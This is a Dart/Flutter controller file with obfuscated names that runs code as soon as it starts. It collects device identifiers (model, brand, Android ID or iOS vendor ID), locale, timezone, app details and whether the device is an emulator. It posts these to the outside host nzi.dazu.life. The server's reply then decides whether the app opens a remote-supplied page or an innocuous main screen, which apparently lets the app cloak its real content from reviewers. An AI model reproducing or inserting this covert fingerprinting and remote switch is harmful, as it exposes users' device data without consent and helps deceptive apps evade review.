import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var btzxfyp = RxBool(false);
  var tjscnlubz = RxBool(true);
  var crlo = RxString("");
  var kamron = RxBool(false);
  var johnston = RxBool(true);
  final ubsqrtm = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ziosdfx();
  }


  Future<void> ziosdfx() async {

    kamron.value = true;
    johnston.value = true;
    tjscnlubz.value = false;

    ubsqrtm.post("https://nzi.dazu.life/TaeLCsQvqSF",data: await pnkjibguz()).then((value) {
      var foecr = value.data["foecr"] as String;
      var avnfgw = value.data["avnfgw"] as bool;
      if (avnfgw) {
        crlo.value = foecr;
        madie();
      } else {
        casper();
      }
    }).catchError((e) {
      tjscnlubz.value = true;
      johnston.value = true;
      kamron.value = false;
    });
  }

  Future<Map<String, dynamic>> pnkjibguz() async {
    final DeviceInfoPlugin eoshyz = DeviceInfoPlugin();
    PackageInfo bfxhnrep_kjdaf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fzmoa = Platform.localeName;
    var JVquLyM = currentTimeZone;

    var NZSFcwf = bfxhnrep_kjdaf.packageName;
    var fdmis = bfxhnrep_kjdaf.version;
    var jCkZRur = bfxhnrep_kjdaf.buildNumber;

    var dSiYEfND = bfxhnrep_kjdaf.appName;
    var wjUQz = "";
    var adellFunk = "";
    var sSYEf  = "";
    var OLMGFxZt = "";
    var nathanaelQuigley = "";
    var alexanneQuitzon = "";
    var damonBins = "";
    var ameliaGoyette = "";


    var jnuRV = "";
    var Wglckp = false;

    if (GetPlatform.isAndroid) {
      jnuRV = "android";
      var bugany = await eoshyz.androidInfo;

      OLMGFxZt = bugany.brand;

      wjUQz  = bugany.model;
      sSYEf = bugany.id;

      Wglckp = bugany.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jnuRV = "ios";
      var faqutwjec = await eoshyz.iosInfo;
      OLMGFxZt = faqutwjec.name;
      wjUQz = faqutwjec.model;

      sSYEf = faqutwjec.identifierForVendor ?? "";
      Wglckp  = faqutwjec.isPhysicalDevice;
    }
    var res = {
      "adellFunk" : adellFunk,
      "dSiYEfND": dSiYEfND,
      "jCkZRur": jCkZRur,
      "fdmis": fdmis,
      "wjUQz": wjUQz,
      "sSYEf": sSYEf,
      "NZSFcwf": NZSFcwf,
      "JVquLyM": JVquLyM,
      "fzmoa": fzmoa,
      "damonBins" : damonBins,
      "jnuRV": jnuRV,
      "Wglckp": Wglckp,
      "OLMGFxZt": OLMGFxZt,
      "alexanneQuitzon" : alexanneQuitzon,
      "nathanaelQuigley" : nathanaelQuigley,
      "ameliaGoyette" : ameliaGoyette,

    };
    return res;
  }

  Future<void> casper() async {
    Get.offAllNamed("/widgetMain");
  }

  Future<void> madie() async {
    Get.offAllNamed("/yoga");
  }

}
